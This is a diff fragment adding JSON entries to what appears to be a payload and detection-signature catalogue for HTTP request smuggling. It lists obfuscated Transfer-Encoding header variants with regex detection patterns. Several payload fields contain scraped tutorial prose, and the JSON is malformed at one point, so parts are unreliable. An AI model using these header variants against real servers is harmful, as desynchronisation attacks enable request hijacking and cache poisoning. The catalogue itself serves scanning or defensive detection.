+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "The\\ front\\-end\\ server\\ uses\\ the\\ Transfer\\-Encoding\\ header\\ and\\ the\\ back\\-end\\ server\\ uses\\ the\\ Content\\-Length\\ header\\.",
+      "tags": [
+        "te.cl"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING Transfer-Encoding : chunked [1925de76]",
+      "payload": "Transfer-Encoding : chunked",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "Transfer\\-Encoding\\ :\\ chunked",
+      "tags": [
+        "te.te-obfuscation"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING Transfer-Encoding: [180555c1]",
+      "payload": "Transfer-Encoding:",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "Transfer\\-Encoding:",
+      "tags": [
+        "generic"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING Transfer-Encoding: blah [a0426b6e]",
+      "payload": "Transfer-Encoding: blah",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "Transfer\\-Encoding:\\ blah",
+      "tags": [
+        "generic"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING Transfer-Encoding: chunked [ee0d5ce7]",
+      "payload": "Transfer-Encoding: chunked",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "Transfer\\-Encoding:\\ chunked",
+      "tags": [
+        "te.te-obfuscation"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING Transfer-Encoding: x [c00a8b4b]",
+      "payload": "Transfer-Encoding: x",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "Transfer\\-Encoding:\\ x",
+      "tags": [
+        "generic"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING Transfer-Encoding: xchunked [9dae7465]",
+      "payload": "Transfer-Encoding: xchunked",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "Transfer\\-Encoding:\\ xchunked",
+      "tags": [
+        "te.te-obfuscation"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING Transfer-Encoding: xchunked Transfer-Enc [79276a3b]",
+      "payload": "Transfer-Encoding: xchunked\nTransfer-Encoding : chunked\nTransfer-Encoding: chunked\nTransfer-Encoding: x\nTransfer-Encoding:[tab]chunked\nGET / HTTP/1.1\n Transfer-Encoding: chunked\nX: X[\\n]Transfer-Encoding: chunked\nTransfer-Encoding\n : chunked\nEach of these quirks is harmless if both the front-end and back-end server have it, and a major threat otherwise. For yet more techniques, check out regilero's ongoing research. We'll look at practical examples using other techniques shortly.",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "Transfer\\-Encoding:\\ xchunked\\\nTransfer\\-Encoding\\ :\\ chunked\\\nTransfer\\-Encoding:\\ chunked\\\nTransfer\\-Encoding:\\ x\\\nTransfer\\-Encoding:\\[tab\\]chunked\\\nGET\\ /\\ HTTP/1\\.1\\\n\\ Transfer\\-Encoding:\\ chunked\\\nX:\\ X\\[\\\\n\\]Transfer\\-Encoding:\\ chunked\\\nTransfer\\-Encoding\\\n\\ :\\ chunked\\\nEach\\ of\\ these\\ quirks\\ is\\ harmless\\ if\\ both\\ the\\ front\\-end\\ and\\ back\\-end\\ server\\ have\\ it,\\ and\\ a\\ major\\ threat\\ otherwise\\.\\ For\\ yet\\ more\\ techniques,\\ check\\ out\\ regilero's\\ ongoing\\ research\\.\\ We'll\\ look\\ at\\ practical\\ examples\\ using\\ other\\ techniques\\ shortly\\.",
+      "tags": [
+        "te.te-obfuscation"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING Transfer-Encoding: xchunked Transfer-Enc [f809f4bd]",
+      "payload": "Transfer-Encoding: xchunked\nTransfer-Encoding : chunked\nTransfer-Encoding: chunked\nTransfer-Encoding: x\nTransfer-Encoding:[tab]chunked\n[space]Transfer-Encoding: chunked\nX: X[\\n]Transfer-Encoding: chunked\nTransfer-Encoding\n: chunked\nHTTP/2 Request Smuggling\nHTTP/2 request smuggling can occur if a machine converts your HTTP/2 request to HTTP/1.1, and you can smuggle an invalid content-length header, transfer-encoding header or new lines (CRLF) into the translated request. HTTP/2 request smuggling can also occur in a GET request, if you can hide an HTTP/1.1 request inside an HTTP/2 header",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "Transfer\\-Encoding:\\ xchunked\\\nTransfer\\-Encoding\\ :\\ chunked\\\nTransfer\\-Encoding:\\ chunked\\\nTransfer\\-Encoding:\\ x\\\nTransfer\\-Encoding:\\[tab\\]chunked\\\n\\[space\\]Transfer\\-Encoding:\\ chunked\\\nX:\\ X\\[\\\\n\\]Transfer\\-Encoding:\\ chunked\\\nTransfer\\-Encoding\\\n:\\ chunked\\\nHTTP/2\\ Request\\ Smuggling\\\nHTTP/2\\ request\\ smuggling\\ can\\ occur\\ if\\ a\\ machine\\ converts\\ your\\ HTTP/2\\ request\\ to\\ HTTP/1\\.1,\\ and\\ you\\ can\\ smuggle\\ an\\ invalid\\ content\\-length\\ header,\\ transfer\\-encoding\\ header\\ or\\ new\\ lines\\ \\(CRLF\\)\\ into\\ the\\ translated\\ request\\.\\ HTTP/2\\ request\\ smuggling\\ can\\ also\\ occur\\ in\\ a\\ GET\\ request,\\ if\\ you\\ can\\ hide\\ an\\ HTTP/1\\.1\\ request\\ inside\\ an\\ HTTP/2\\ header",
+      "tags": [
+        "http2",
+        "te.cl",
+        "te.te-obfuscation"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING Transfer-Encoding: zchunked [d919ac0e]",
+      "payload": "Transfer-Encoding: zchunked",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "Transfer\\-Encoding:\\ zchunked",
+      "tags": [
+        "generic"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING Transfer-Encoding:[tab]chunked [d33c91f3]",
+      "payload": "Transfer-Encoding:\tchunked",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "placeholders": {
+       "[tab]": "\\t"
+     },
+     "regex_flags": "m",
+      "detection_pattern": "Transfer\\-Encoding:\\[tab\\]chunked",
+      "tags": [
+        "generic"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING Transfer-encoding: cow [9abe43b6]",
+      "payload": "Transfer-encoding: cow",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "Transfer\\-encoding:\\ cow",
+      "tags": [
+        "generic"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING X: X[\\n]Transfer-Encoding: chunked [0c6b7c37]",
+      "payload": "X: X[\\n]Transfer-Encoding: chunked",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "X:\\ X\\[\\\\n\\]Transfer\\-Encoding:\\ chunked",
+      "tags": [
+        "te.te-obfuscation"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "REQUEST_SMUGGLING",
+      "name": "REQUEST_SMUGGLING [space]Transfer-Encoding: chunked [7e5df055]",
+      "payload": "[space]Transfer-Encoding: chunked",
+      "description": "HTTP request desynchronization / smuggling vector",
+      "confidence_score": 0.7,
+      "context": "raw-http",
+      "detection_pattern": "\\[space\\]Transfer\\-Encoding:\\ chunked",
+      "tags": [
+        "te.te-obfuscation"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    }
+  ]
+}
